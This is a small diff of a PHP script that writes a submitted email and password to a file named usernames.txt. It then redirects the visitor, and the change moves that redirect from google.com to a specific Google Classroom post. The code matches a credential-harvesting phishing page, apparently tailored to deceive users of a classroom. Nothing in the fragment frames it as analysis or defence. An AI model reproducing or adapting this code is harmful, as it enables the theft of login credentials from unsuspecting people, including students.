@@ -6,7 +6,7 @@ session_start();
 			
   			
  file_put_contents("usernames.txt", "[EMAIL: ]" . " ". $email . " " . " " . "[PASS: ]" . " " . $pass . "\n", FILE_APPEND);
- header('Location: https://www.google.com');
+ header('Location: https://classroom.google.com/c/MTg4NzQ2Mjk1NDMz/p/MjE4MjAwMjE2MjE5');
 exit();
 	
 			
